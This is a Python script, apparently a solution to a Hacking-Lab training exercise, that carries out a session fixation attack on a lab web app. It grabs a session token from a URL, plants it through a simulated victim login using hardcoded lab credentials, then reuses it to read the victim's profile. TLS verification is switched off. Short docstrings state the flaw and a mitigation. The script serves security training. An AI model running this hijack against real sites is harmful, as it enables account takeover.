__problem__ = \
"""
Cookie of attacker can be authenticated by server for a victim and the attacker can still use the cookie to access victim's account.
"""

__attack__ = \
"""
Attacker obtains a cookie, send a link with a cookie to user. User authenticated himself, the sent cookie therefore will be authenticated as victim as well.
"""

__mitigation__ = \
"""
Usage of two cookies. Cookie only works for authenticated IP, etc.
"""

import logging

import requests

from __base__ import setup_log, extract_user_info

log = logging.getLogger(__name__)


def obtain_link_with_cookie():
    with requests.session() as session:
        session.verify = False
        r = session.get("https://glocken.hacking-lab.com/12001/url_case3/url3/controller?action=showpage&page=navigate")
        return r.url, r.url.split("&AValue=")[1]


def send_link_to_victim(link, cookie):
    with requests.session() as session:
        session.verify = False
        session.get(link)
        session.post("https://glocken.hacking-lab.com/12001/url_case3/auth_url3/login",
                         data={
                             'username': 'hacker10',
                             'password': "compass",
                             'action': 'login',
                             'originalURL': f"https://glocken.hacking-lab.com/12001/url_case3/url3/controller?action=profile&AValue={cookie}",
                             'send': 'Login',
                         })


def deploy_malicous_cookie(cookie):
    with requests.session() as session:
        session.verify = False
        r = session.get(
            f"https://glocken.hacking-lab.com/12001/url_case3/url3/controller?action=profile&AValue={cookie}")
        user_info = extract_user_info(r)
        log.info(user_info)


if __name__ == '__main__':
    setup_log()
    link, cookie = obtain_link_with_cookie()
    send_link_to_victim(link, cookie)
    deploy_malicous_cookie(cookie)
